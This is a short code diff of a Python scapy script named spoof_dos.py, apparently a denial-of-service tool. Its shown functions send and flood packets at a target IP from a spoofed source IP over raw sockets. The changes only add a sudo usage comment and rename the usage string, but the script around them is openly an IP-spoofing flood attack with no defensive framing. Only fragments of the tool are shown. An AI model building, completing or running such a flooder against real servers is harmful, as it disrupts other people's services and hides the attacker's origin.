@@ -4,6 +4,13 @@ import time
 import asyncio
 from scapy.all import *
 
+
+
+
+#USAGE sudo python3 spoof_dos.py 
+
+
+
 async def send_packets(target_ip, spoofed_ip, target_port, spoofed_port, payload, packet_count, iface):
     try:
         conf.L3socket = L3RawSocket
@@ -25,7 +32,7 @@ async def flood_worker(target_ip, spoofed_ip, target_port, spoofed_port, payload
 def main():
     try:
         if len(sys.argv) != 4:
-            print("Usage: python3 Possibility.py <server_IP> <interface> <spoofed_ip>")
+            print("Usage: python3 spoof_dos.py <server_IP> <interface> <spoofed_ip>")
             return
 
         target_ip = sys.argv[1]
